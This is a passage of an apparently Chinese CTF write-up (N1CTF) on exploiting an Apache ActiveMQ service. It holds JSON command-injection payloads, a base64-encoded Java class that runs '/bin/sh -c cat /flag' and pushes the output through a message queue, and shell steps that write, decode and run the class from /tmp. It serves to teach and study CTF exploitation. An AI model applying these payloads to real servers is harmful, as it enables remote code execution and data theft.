class="string">&quot;http://127.0.0.1:8877/api/sun.print.&quot;</span>);</span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(obj);</span><br><span class="line">   <span class="built_in">this</span>.wireFormat.marshal(response, <span class="built_in">this</span>.dataOut);</span><br><span class="line">    <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 编译好的class的base64 &gt; /tmp/nmlgb.txt</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;cmd&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;</span>,<span class="string">&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>然后 base64 编码，放入 oneway 的路径🤪</p><p>经调试，由于一次性不能写那么长的内容，只能曲线救国</p><p>分段写入 1 和 2, 然后合并写入 3, 再 base64 解码 (这 nm 是人能搞出来的操作？本来就恶心，还给👴使绊，差不多得了😅😓)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\n&#x27;|tee /tmp/3&quot;</span>,<span class="string">&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\n&#x27;|tee /tmp/3&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;</span>,<span class="string">&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJscGNBbGxDb20iOlsiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIiwiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIl19</span><br></pre></td></tr></table></figure><p>解码，写出 Main.class</p><p>java 运行🤔</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp /opt/apache-activemq/lib/optional<span class="comment">/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;</span>,<span class="string">&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p>wcsndm, 本地环境 base64tmd 写不了文件😅,√Ⅷssrf 命令执行也尽恶心人，题目还不给编译，你 tmjava 不用编译是吧😓😅, 手</p><p>搓 class 文件是吧.</p><p>哦，源赖氏 java11 编译和运行一体化，一个 java 就能搞定，nmsl (那没事了)😊</p><p>之后调用 comsume 函数就行，由于 flag 已经写入队列了，读队列就行了.🤣</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699428078871.png" alt="1699428078871"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">         main.consume();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">consume</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://target:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> 